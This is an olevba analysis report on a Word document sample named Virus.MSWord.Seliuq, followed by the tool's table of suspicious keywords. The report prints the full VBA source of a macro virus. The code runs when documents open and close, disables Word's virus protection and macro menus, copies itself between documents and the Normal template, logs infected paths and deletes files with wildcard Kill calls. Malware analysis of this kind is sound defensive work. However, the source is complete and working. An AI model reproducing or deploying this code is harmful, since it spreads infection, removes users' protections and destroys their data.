olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Seliuq-cb2378b64d1de5ec46d985d70dcb69dadd9e0324
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Aquiles.cls 
in file: Virus.MSWord.Seliuq-cb2378b64d1de5ec46d985d70dcb69dadd9e0324 - OLE stream: 'Macros/VBA/Aquiles'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Open()
 On Error Resume Next
 If ActiveDocument.VBProject.VBComponents.Count > 1 Then
 For op = 2 To ActiveDocument.VBProject.VBComponents.Count
   cantidad = ActiveDocument.VBProject.VBComponents.Item(op).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents.Item(op).CodeModule.DeleteLines 1, cantidad
 Next op
 End If
 If NormalTemplate.VBProject.VBComponents.Count > 1 Then
 For op = 2 To NormalTemplate.VBProject.VBComponents.Count
   cantidad = NormalTemplate.VBProject.VBComponents.Item(op).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents.Item(op).CodeModule.DeleteLines 1, cantidad
 Next op
 End If
 Document_Close
End Sub
Private Sub Document_Close()
 On Error Resume Next
 CommandBars("Visual Basic").Visible = False
 Options.VirusProtection = False
 CommandBars("Tools").Controls("Macro").Enabled = False
 CommandBars("View").Controls(6).Enabled = False
 CommandBars("tools").Controls(15).Enabled = False
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 If MacroContainer.FullName = ActiveDocument.FullName Then
  If nt.Name <> "Aquiles" Then GoTo ClaudioNormal
 Else
  If ad.Name <> "Aquiles" Then GoTo Aquilesdocument
 End If
GoTo Findelmundo
Aquilesdocument:
 lineas = ad.CodeModule.CountOfLines
 ad.CodeModule.DeleteLines 1, lineas
 lineas = 1
 Do While lineas <= nt.CodeModule.CountOfLines
    cadenadecodigo = nt.CodeModule.lines(lineas, 1)
    ad.CodeModule.insertlines lineas, cadenadecodigo
    lineas = lineas + 1
 Loop
 ad.Name = "Aquiles"
 Open "C:\systemDos" For Append As #1
   Print #1, ActiveDocument.Path
 Close #1
 ActiveDocument.Save
GoTo Findelmundo
ClaudioNormal:
 lineas = nt.CodeModule.CountOfLines
 nt.CodeModule.DeleteLines 1, lineas
 lineas = 1
 Do While lineas <= ad.CodeModule.CountOfLines
    cadenadecodigo = ad.CodeModule.lines(lineas, 1)
    nt.CodeModule.insertlines lineas, cadenadecodigo
    lineas = lineas + 1
 Loop
 nt.Name = "Aquiles"
 NormalTemplate.Save
Findelmundo:
If Dir("C:\systemDos", vbNormal) <> "" Then
If FileLen("C:\systemDos") > 1024 Then
  Open "C:\systemDos" For Input As #1
    Line Input #1, direccion
    Do While Not EOF(1)
      Kill (s + "\*.*")
      Line Input #1, direccion
    Loop
  Close #1
  Kill ("C:\systemDos")
End If
End If
'Al rio jactancioso, Dios le a puesto un vado. Malinke
'Y una vez mas el emperador interpuso su alma, claudIo
'esto es una modificacion, trato de llegar a la perfeccion
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

